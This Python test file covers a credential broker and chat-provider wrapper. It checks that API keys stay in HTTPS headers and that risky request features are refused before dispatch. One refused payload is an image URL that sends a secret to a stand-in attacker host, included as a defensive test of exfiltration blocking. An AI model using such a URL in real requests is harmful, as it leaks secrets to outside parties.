import json
from pathlib import Path
import tempfile
import unittest

from enkstein_guard.broker import CredentialBroker
from enkstein_guard.contracts import SecurityContext
from enkstein_guard.providers import BrokeredChatProvider
from enkstein_guard.runtime import AccessDenied, Operation
from enkstein_guard.vault import LocalVault


class ProviderTests(unittest.IsolatedAsyncioTestCase):
    async def test_brokered_key_only_in_https_header(self):
        with tempfile.TemporaryDirectory() as tmp:
            root=Path(tmp)
            vault=LocalVault.initialize(root/'data/v.db', root/'keys/key.json')
            broker=CredentialBroker(vault)
            broker.register('api', 'provider-secret', tenant='t', principal='p', route='model', destination='api.example.com')
            provider=BrokeredChatProvider(endpoint='https://api.example.com/v1/chat/completions', allowed_hosts={'api.example.com'},
                                          model='fixed-model', broker=broker, credential_name='api')
            captured=[]
            class Response:
                status=200
                def __enter__(self): return self
                def __exit__(self,*args): pass
                def read(self, size): return b'{"choices":[]}'
            class Opener:
                def open(self, request, timeout):
                    captured.append((request, timeout)); return Response()
            provider._opener=Opener()
            op=Operation(SecurityContext('t','p','a','w','o','model.call','v'),'model','fixed-model','api.example.com',
                         '{"messages":[{"role":"user","content":"tokenized"}]}','digest')
            self.assertEqual(await provider.call(op), {'choices':[]})
            request,_=captured[0]
            self.assertEqual(request.get_header('Authorization'), 'Bearer provider-secret')
            self.assertNotIn(b'provider-secret',request.data)
            self.assertEqual(json.loads(request.data)['model'],'fixed-model')
            overridden=Operation(op.context,op.route,op.resource,op.destination,'{"model":"other"}',op.digest)
            with self.assertRaises(AccessDenied): await provider.call(overridden)
            self.assertEqual(len(captured),1)

    def capturing_provider(self, root):
        vault = LocalVault.initialize(root / 'data/v.db', root / 'keys/key.json')
        broker = CredentialBroker(vault)
        broker.register('api', 'provider-secret', tenant='t', principal='p', route='model', destination='api.example.com')
        provider = BrokeredChatProvider(endpoint='https://api.example.com/v1/chat/completions',
                                        allowed_hosts={'api.example.com'}, model='fixed-model', broker=broker,
                                        credential_name='api')
        captured = []

        class Response:
            status = 200
            def __enter__(self): return self
            def __exit__(self, *args): pass
            def read(self, size): return b'{"choices":[]}'

        class Opener:
            def open(self, request, timeout):
                captured.append(json.loads(request.data))
                return Response()
        provider._opener = Opener()
        return provider, captured

    def operation(self, payload):
        return Operation(SecurityContext('t', 'p', 'a', 'w', 'o', 'model.call', 'v'), 'model', 'fixed-model',
                         'api.example.com', json.dumps(payload), 'digest')

    async def test_provider_side_fetch_hosted_tools_and_storage_refused_before_dispatch(self):
        text = {"role": "user", "content": "summarize"}
        refused = {
            "image_url_part": {"messages": [{"role": "user", "content": [
                {"type": "text", "text": "see"},
                {"type": "image_url", "image_url": {"url": "https://attacker.example/p.png?d=secret"}}]}]},
            "input_audio_part": {"messages": [{"role": "user", "content": [
                {"type": "input_audio", "input_audio": {"data": "AAAA", "format": "wav"}}]}]},
            "file_part": {"messages": [{"role": "user", "content": [{"type": "file", "file": {"file_id": "f-1"}}]}]},
            "web_search": {"messages": [text], "web_search_options": {}},
            "hosted_tool": {"messages": [text], "tools": [{"type": "web_search"}]},
            "code_interpreter": {"messages": [text], "tools": [{"type": "code_interpreter"}]},
            "store": {"messages": [text], "store": True, "metadata": {"k": "v"}},
            "audio_output": {"messages": [text], "modalities": ["text", "audio"], "audio": {"voice": "x"}},
            "legacy_functions": {"messages": [text], "functions": [{"name": "f"}]},
            "unknown_field": {"messages": [text], "prediction": {"type": "content", "content": "x"}},
            "user_attribution": {"messages": [text], "user": "someone-else"},
            "no_messages": {"temperature": 0},
            "bad_role": {"messages": [{"role": "root", "content": "x"}]},
            "tool_call_shape": {"messages": [{"role": "assistant", "content": None,
                                              "tool_calls": [{"id": "1", "type": "web_search", "function": {}}]}]},
        }
        with tempfile.TemporaryDirectory() as tmp:
            provider, captured = self.capturing_provider(Path(tmp))
            for name, payload in refused.items():
                with self.subTest(name=name):
                    with self.assertRaises(AccessDenied):
                        await provider.call(self.operation(payload))
            self.assertEqual(captured, [])

    async def test_text_chat_function_tools_and_formats_allowed(self):
        allowed = [
            {"messages": [{"role": "system", "content": "be brief"}, {"role": "user", "content": "hi"}],
             "temperature": 0.2, "max_tokens": 64, "stop": ["\n\n"], "seed": 7},
            {"messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
             "response_format": {"type": "json_schema", "json_schema": {"name": "x", "schema": {}}}},
            {"messages": [{"role": "user", "content": "weather?"},
                          {"role": "assistant", "content": None, "tool_calls": [
                              {"id": "c1", "type": "function", "function": {"name": "lookup", "arguments": "{}"}}]},
                          {"role": "tool", "tool_call_id": "c1", "content": "sunny"}],
             "tools": [{"type": "function", "function": {"name": "lookup", "parameters": {"type": "object"}}}],
             "tool_choice": "auto", "parallel_tool_calls": False},
        ]
        with tempfile.TemporaryDirectory() as tmp:
            provider, captured = self.capturing_provider(Path(tmp))
            for payload in allowed:
                with self.subTest(payload=payload):
                    self.assertEqual(await provider.call(self.operation(payload)), {"choices": []})
            self.assertEqual(len(captured), len(allowed))
            self.assertTrue(all(body["model"] == "fixed-model" and body["stream"] is False for body in captured))

    async def test_insecure_endpoint_and_redirect_configuration_rejected(self):
        for endpoint in ('http://api.example.com/v1/chat/completions',
                         'https://other.example.com/v1/chat/completions',
                         'https://user:password@api.example.com/v1/chat/completions',
                         'https://api.example.com/v1/chat/completions?secret=value'):
            with self.assertRaises(ValueError):
                BrokeredChatProvider(endpoint=endpoint,allowed_hosts={'api.example.com'},model='m',broker=None,credential_name='api')

    async def test_hatz_key_authentication_stays_out_of_payload(self):
        from unittest.mock import Mock
        provider=BrokeredChatProvider(endpoint="https://ai.hatz.ai/v1/chat/completions",allowed_hosts={"ai.hatz.ai"},
                                      model="fixed",broker=None,credential_name="api",authentication="x-api-key")
        class Response:
            status=200
            def __enter__(self): return self
            def __exit__(self,*args): pass
            def read(self,size): return b'{"choices":[]}'
        provider._opener=Mock()
        provider._opener.open.return_value=Response()
        provider._request("hatz-secret",{"messages":[]})
        request=provider._opener.open.call_args.args[0]
        self.assertEqual(request.get_header("X-api-key"),"hatz-secret")
        self.assertIsNone(request.get_header("Authorization"))
        self.assertNotIn(b"hatz-secret",request.data)
